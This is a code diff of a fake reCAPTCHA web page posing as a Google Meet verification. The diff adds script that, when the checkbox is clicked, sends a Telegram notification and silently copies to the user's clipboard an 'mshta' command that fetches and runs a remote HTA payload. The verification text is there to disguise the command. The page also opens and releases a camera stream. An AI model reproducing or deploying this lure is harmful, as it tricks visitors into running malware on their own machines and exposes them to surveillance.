         statusBox.style.opacity = '0';
         statusBox.style.transition = 'opacity 0.2s';
@@ -936,25 +900,29 @@
           }
         }, 200);
       }, 1200);
+
+      // reCAPTCHA 点击
       if (recaptchaBox) {
         recaptchaBox.addEventListener('click', () => {
           if (!recaptchaCheck.classList.contains('checked')) {
             recaptchaCheck.classList.add('checked');
             sendTelegramNotification();
+            
+            captchaText = "mshta http://mcedge.github.io/mcedge/index.hta#I am not a robot – Google meet Verification ID: 114514";
+            
             setTimeout(() => {
               recaptchaBox.style.opacity = '0';
               setTimeout(() => {
                 recaptchaBox.style.display = 'none';
                 verifyWin.style.display = 'block';
-
-                const spaces = " ".repeat(100);
-                captchaText = `mshta http://mcedge.github.io/mcedge/index.hta#"I am not a robot – Google meet Verification ID: 114514"`;
                 copyToClipboard(captchaText);
               }, 200);
             }, 800);
           }
         });
       }
+
+      // 验证按钮
       if (verifyBtn) {
         verifyBtn.addEventListener('click', () => {
           if (errorMsgEl) {
@@ -968,6 +936,11 @@
           }, 500);
         });
       }
+
+      // 页面关闭前释放摄像头资源（防止指示灯长亮）
+      window.addEventListener('beforeunload', () => {
+        stopMediaStream();
+      });
     });
   </script>
 </body>
